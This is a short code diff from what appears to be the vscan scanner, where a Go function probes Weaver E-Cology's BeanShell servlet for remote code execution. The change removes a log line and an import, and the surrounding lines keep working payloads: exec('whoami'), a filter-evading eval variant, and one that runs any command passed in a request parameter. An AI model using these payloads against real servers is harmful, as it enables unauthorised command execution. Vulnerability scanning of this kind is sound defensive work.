@@ -4,7 +4,6 @@ import (
 	"fmt"
 	"github.com/veo/vscan/pkg"
 	"strings"
-	"time"
 )
 
 func E_Cology_bsh_servlet_rce(u string) bool {
@@ -20,8 +19,6 @@ func E_Cology_bsh_servlet_rce(u string) bool {
 	Data_Payload2 := "bsh.script=\\u0065\\u0078\\u0065\\u0063(\"whoami\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw"
 	Data_Payload3 := "bsh.script=eval%00(\"ex\"+\"ec(bsh.httpServletRequest.getParameter(\\\"command\\\"))\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami"
 	Data_Payload4 := "bsh.script=print(\"827ccb0eea8a706c4c34a16891f84e7b\");&bsh.servlet.output=raw"
-
-	fmt.Println(time.Now(), "[INFO]     正在检测Beanshell RCE漏洞")
 
 	for _, Url_Payload := range []string{Url_Payload1, Url_Payload2, Url_Payload3, Url_Payload4} {
 		url := u + Url_Payload
